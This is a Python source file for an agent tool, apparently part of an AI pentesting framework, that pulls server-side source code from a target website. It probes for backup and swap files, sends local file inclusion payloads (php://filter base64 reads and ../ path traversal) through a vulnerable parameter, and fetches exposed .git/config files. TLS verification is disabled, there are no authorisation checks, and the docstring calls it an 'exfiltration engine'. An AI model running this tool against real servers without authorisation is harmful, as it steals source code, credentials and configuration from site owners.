"""Source Code Downloader Tool — the ultimate exfiltration engine."""

import requests
import asyncio
import urllib3
import base64
from typing import Any, Dict, List
from testinggpt.tools.base import BaseTool
from testinggpt.core.events import EventBus

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SourceCodeDownloaderTool(BaseTool):
    """Tool for automating the retrieval of server-side source code."""

    def __init__(self) -> None:
        """Initialize SourceCodeDownloaderTool."""
        super().__init__(
            name="source_downloader",
            description="Attempt to extract server-side source code (PHP, ASP, Configs) using multiple techniques: LFI, Backup discovery, Git exploitation, and more."
        )

    def get_schema(self) -> dict[str, Any]:
        """Get parameter schema."""
        return {
            "type": "object",
            "properties": {
                "target_url": {
                    "type": "string",
                    "description": "The URL of the script to extract (e.g., https://example.com/index.php)."
                },
                "lfi_gateway": {
                    "type": "string",
                    "description": "Optional: A known LFI-vulnerable URL to use as a gateway (e.g., https://example.com/view.php?file=)."
                }
            },
            "required": ["target_url"]
        }

    async def _check_backup(self, session: requests.Session, url: str) -> str | None:
        extensions = [".bak", ".old", "~", ".swp", ".swo", ".php.bak", ".inc", ".src"]
        for ext in extensions:
            target = f"{url}{ext}"
            try:
                r = session.get(target, verify=False, timeout=3)
                if r.status_code == 200 and ("<?php" in r.text or "<?=" in r.text):
                    return f"FOUND BACKUP: {target}\nContent:\n{r.text[:1000]}"
            except: pass
        return None

    async def _test_lfi(self, session: requests.Session, gateway: str, resource: str) -> str | None:
        payloads = [
            f"php://filter/read=convert.base64-encode/resource={resource}",
            f"php://filter/convert.base64-encode/resource={resource}",
            f"../{resource}",
            f"../../{resource}",
            f"../../../{resource}"
        ]
        for p in payloads:
            url = f"{gateway}{p}"
            try:
                r = session.get(url, verify=False, timeout=5)
                if r.status_code == 200:
                    if "PD9wa" in r.text: # Base64 for <?php
                        try:
                            decoded = base64.b64decode(r.text).decode('utf-8')
                        except:
                            decoded = r.text
                        return f"LFI SUCCESS ({url}):\n{decoded[:2000]}"
                    elif "<?php" in r.text:
                        return f"LFI SUCCESS ({url}):\n{r.text[:2000]}"
            except: pass
        return None

    async def execute(self, target_url: str = "", lfi_gateway: str = None, **kwargs: Any) -> dict[str, Any]:
        if not target_url:
            return {"success": False, "result": "No target URL provided."}

        events = EventBus.get()
        events.emit_message(f"🚀 [SOURCE DOWNLOADER] Targeting: {target_url}...", "info")
        
        session = requests.Session()
        results = []

        # 1. Check for backups
        backup_res = await self._check_backup(session, target_url)
        if backup_res:
            results.append(backup_res)

        # 2. Check for LFI if gateway is provided
        if lfi_gateway:
            lfi_res = await self._test_lfi(session, lfi_gateway, target_url.split('/')[-1])
            if lfi_res:
                results.append(lfi_res)

        # 3. Check for .git leak
        git_url = "/".join(target_url.split('/')[:-1]) + "/.git/config"
        try:
            r = session.get(git_url, verify=False, timeout=3)
            if r.status_code == 200 and "[core]" in r.text:
                results.append(f"FOUND .GIT LEAK: {git_url}\n{r.text}")
        except: pass

        if results:
            summary = "\n\n".join(results)
            events.emit_message(f"✅ [SOURCE DOWNLOADER] Successful extraction!", "success")
            return {"success": True, "result": summary}
        
        return {"success": False, "result": "Failed to extract source code using automated methods."}
